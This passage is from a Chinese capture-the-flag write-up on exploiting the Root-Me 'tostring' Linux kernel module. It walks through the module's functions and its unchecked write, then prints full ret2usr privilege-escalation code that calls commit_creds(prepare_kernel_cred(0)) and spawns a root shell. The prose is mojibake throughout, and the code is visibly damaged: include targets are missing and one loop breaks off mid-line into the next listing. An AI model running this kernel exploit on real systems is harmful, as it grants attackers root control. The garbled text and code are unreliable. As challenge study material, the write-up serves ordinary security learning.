    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
æ¥å¯åŠ¨è¿™ä¸ªKernelã€‚
**ğŸš«ï¼šæ­¤å¤„è‹¥ä½¿ç”¨Mac osä¸‹çš„`qemu-system`å°†ä¼šæ˜¾ç¤º`There is no option group
'fsdev'`é”™è¯¯ï¼Œå› æ­¤è¯·ä½¿ç”¨Ubuntuä½œä¸ºè°ƒè¯•ç¯å¢ƒã€‚**
###  åˆ†æInitæ–‡ä»¶
    #!/bin/sh
    mount -t devtmpfs none /dev
    mount -t proc proc /proc
    mount -t sysfs sysfs /sys
    #
    # flag
    #
    mkdir -p /passwd
    mount -t ext2 -o ro /dev/sda /passwd
    #
    # share
    #
    mkdir -p /mnt/share
    mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync
    chmod 777 /mnt/share/
    #
    # module
    #
    insmod /lib/modules/*/rootme/*.ko
    chmod 666 /dev/tostring 
    # mmap_min_addr to 0 for the challenge to be simpler for now ;)
    echo 0 > /proc/sys/vm/mmap_min_addr
    #
    # shell
    #
    cat /etc/issue
    export ENV=/etc/profile
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    umount /dev
    poweroff -f
ç¨‹åºå°†ä½äº`/lib/modules/*/rootme/*.ko`çš„LKMsæ–‡ä»¶ä½¿ç”¨`insmod`å‘½ä»¤åŠ è½½åˆ°Kernelã€‚
åœ¨é‚£ä¹‹åï¼Œ **è§£é™¤äº†`mmap_min_addr`ä¿æŠ¤**ã€‚
å¹¶ä¸”å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬éœ€è¦è¯»å–çš„flagå°†ä½äº`/dev/sda`ã€‚
###  LKMsæ–‡ä»¶åˆ†æ
ä»…å¼€å¯äº†LKMsä¿æŠ¤ï¼Œå¹¶ä¸”é¢˜ç›®æç¤ºæ²¡æœ‰å¼€å¯å…¶ä½™ä¿æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨IDAåˆ†æè¯¥æ–‡ä»¶ã€‚
####  tostring_init()
é¦–å…ˆï¼Œç¨‹åºä½¿ç”¨`alloc_chrdev_region`å‡½æ•°ï¼Œæ¥è®©å†…æ ¸è‡ªåŠ¨ç»™æˆ‘ä»¬åˆ†é…è®¾å¤‡å·ã€‚
ç„¶åç¨‹åºåˆ›å»ºä¸€ä¸ªè®¾å¤‡ç±»ï¼Œå‘½åä¸º`chrdrv`ã€‚
æ¥ä¸‹æ¥åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ï¼ŒæˆåŠŸååˆ™å¼€å§‹åˆå§‹åŒ–`cdev`ã€‚å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦è®¾å¤‡ï¼Œè€Œè¿™ä¸ªå­—ç¬¦è®¾å¤‡ä¸ºæˆ‘ä»¬æä¾›äº†å‡ ä¸ªå‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªPoCç›´æ¥è°ƒç”¨ç›¸å…³å‡½æ•°ã€‚
####  tostring_open()
æ‰“å°`'6Tostring: open()'`åè¿”å›ã€‚
####  tostring_read(int a1)
æ‰“å°`'6Tostring: read()'`åï¼Œå°†ä¼ å…¥çš„å€¼ä½œä¸ºå‚æ•°è°ƒç”¨`0x8000984`ã€‚
####  tostring_read_dec(size_t maxlen, char *s)
æ‰“å°`'6Tostring: read_dec()'`åï¼Œè‹¥`tostring`çš„å€¼å¤§äºé›¶ï¼Œå°†`[0x8000784 + 2 * (tostring -1)]`ä½¿ç”¨`snprintf`æŒ‰`"%lldn"`æ ¼å¼åŒ–åæ‰“å°æœ€å¤š`maxlen`ä¸ªå­—èŠ‚åˆ°ä¼ å…¥çš„å‚æ•°`s`ä¸­å¹¶è¿”å›ï¼Œåœ¨é‚£ä¹‹åï¼Œ`tostring-1`ã€‚
####  tostring_read_hexa(size_t maxlen, char *s)
ä¸`tostring_read_dec(size_t maxlen, char *s)`ç±»ä¼¼ï¼Œåªä¸è¿‡ï¼Œè¿™æ¬¡ç¨‹åºå°†æ‰“å°ä¿¡æ¯æ¢ä¸ºäº†`6Tostring:
read_hexa()`ï¼Œæ ¼å¼åŒ–æ§åˆ¶ç¬¦æ¢ä¸ºäº†`"%16llxn"`ã€‚
####  tostring_write(int a1, int a2)
æ‰“å°`'6Tostring:
write()'`åï¼Œç¨‹åºå°†åˆ†é…ä¸€ä¸ªChunkï¼Œç„¶åå°†a2çš„å‰a1ä¸ªå­—èŠ‚è¯»å…¥Chunkï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ•°æ®è‹¥ä»¥`MH`æˆ–`MD`å¼€å¤´ï¼Œå°†æ”¹å˜`0x8000984`å¤„çš„å€¼åˆ°åº•æ˜¯`tostring_read_dec`äº¦æˆ–æ˜¯`tostring_read_hexa`ã€‚è‹¥è¾“å…¥çš„æ•°æ®ä¸ä»¥`MH`æˆ–`MD`å¼€å¤´ï¼Œç¨‹åºå°†Chunkçš„åœ°å€ç½®äº`0x8000784
+ 2 * tostring`å¤„ã€‚éšåï¼Œ`tostring + 1`ã€‚
####  echoæµ‹è¯•
æˆ‘ä»¬ä½¿ç”¨`echo "1111" > /dev/tostring`æ¥æµ‹è¯•è®¾å¤‡æ˜¯å¦æŒ‚è½½æ­£å¸¸
å‘ç°ç¨‹åºæ­£å¸¸çš„è°ƒç”¨äº†æˆ‘ä»¬åˆ†æçš„å‡½æ•°é“¾ã€‚
###  åŠ¨æ€è°ƒè¯•
å¯¹äºå†…æ ¸çš„è°ƒè¯•ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“æˆ‘ä»¬çš„LKMsè¢«åŠ è½½åˆ°äº†ç¨‹åºçš„å“ªä¸ªä½ç½®ï¼Œä¹Ÿå°±æ˜¯éœ€è¦çŸ¥é“å…¶`.textã€.bssã€.data`èŠ‚åŒºåœ°å€ã€‚
å¯¹äºè¿™äº›åœ°å€ï¼Œå®ƒä»¬é€šå¸¸ä¼šè¢«ä¿å­˜åˆ°ç³»ç»Ÿçš„`/sys/module/[æ¨¡å—å]`ç›®å½•ä¸‹ã€‚
âš ï¸ï¼šæ­¤å¤„æ³¨æ„ï¼Œæˆ‘ä»¬åŠ è½½åˆ°å†…æ ¸çš„æ¨¡å—åä¸ä¸€å®šæ˜¯æ¨¡å—æ–‡ä»¶çš„åå­—ï¼Œå¯ä»¥ä½¿ç”¨`lsmod`å‘½ä»¤æŸ¥çœ‹ã€‚
æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æŸ¥çœ‹èŠ‚åŒºåœ°å€ï¼š
æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨`add-symbol-file`è¿™ä¸ªgdbå‘½ä»¤å‘gdbæŒ‡å®šè¿™ä¸‰ä¸ªåœ°å€ã€‚
ç„¶åå°±å¯ä»¥é™„åŠ è°ƒè¯•äº†ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åœ¨writeå‡½æ•°çš„å…¥å£å¤„ã€‚
æˆåŠŸä¸‹æ–­ã€‚
###  LKMsæ¼æ´åˆ†æ
å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨è¯»å…¥æˆ‘ä»¬å‘é€çš„å€¼æ—¶ï¼Œæ²¡æœ‰åšé•¿åº¦é™å®šï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬äº‹å®ä¸Šå¯ä»¥è¯»å…¥ä»»æ„é•¿å­—èŠ‚ã€‚
è€Œç¨‹åºçš„`0x08000984`å¤„å­˜å‚¨äº†æˆ‘ä»¬readæ—¶å³å°†è°ƒç”¨çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥è¦†ç›–æ‰é‚£ä¸ªæŒ‡é’ˆä¸ºæˆ‘ä»¬æƒ³è¦å…¶ä¸ºçš„å€¼ã€‚
æ§åˆ¶å…¶çš„PoCä¸ºï¼š
    #include 
    #include 
    #include 
    #include 
    int main(){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        int fd = open("/dev/tostring",O_WRONLY);
        for(int i = 0;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5];
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i < 0x40; i++)
            write(fd,Padding,sizeof(Padding));
        write(1,"OK!n",sizeof(Eip));
        *((void**)(Eip)) = &payload;
        write(fd,Eip,sizeof(Eip));
        read(fd,receive,255);
        return 0;
    }
## 0x08 å‚è€ƒé“¾æ¥
[CTF-Wiki Linux Kernel](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel)
[Exploiting Stack Overflows in the Linux Kernel â€“ Jon
Oberheide](https://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/)
[A Kernel Exploit Step by Step â€“
akliilias](https://www.coursehero.com/file/49274885/kernel-exploit-step-by-steppdf/)
[kernel pwnï¼ˆ0ï¼‰ï¼šå…¥é—¨&ret2usr â€“ Magpie](https://www.anquanke.com/post/id/172216)
[Linux-å†…æ ¸ç¼–è¯‘ â€“
å’²å¤œå—æ¢¦](https://196011564.github.io/2020/02/26/Linux-%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/#%E6%89%A7%E8%A1%8C%E4%BB%A5%E4%B8%8B%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BDkernel%E6%BA%90%E7%A0%81)